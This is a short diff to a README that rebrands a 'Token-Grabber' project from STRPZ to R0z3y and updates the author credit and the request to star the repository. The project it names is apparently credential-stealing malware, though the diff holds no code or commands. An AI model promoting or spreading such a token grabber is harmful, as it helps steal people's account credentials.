@@ -1,6 +1,6 @@
-# STRPZ-Token-Grabber
+# R0z3y-Token-Grabber
 
-#### STRPZ-Token-Grabber-V2 was made by R0z3y44
+#### R0z3y-Token-Grabber-V2 was made by R0z3y44
 Love ❌ code ✅
 
 ## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟Star This Repository If You Liked R0z3y Token Grabber V2!
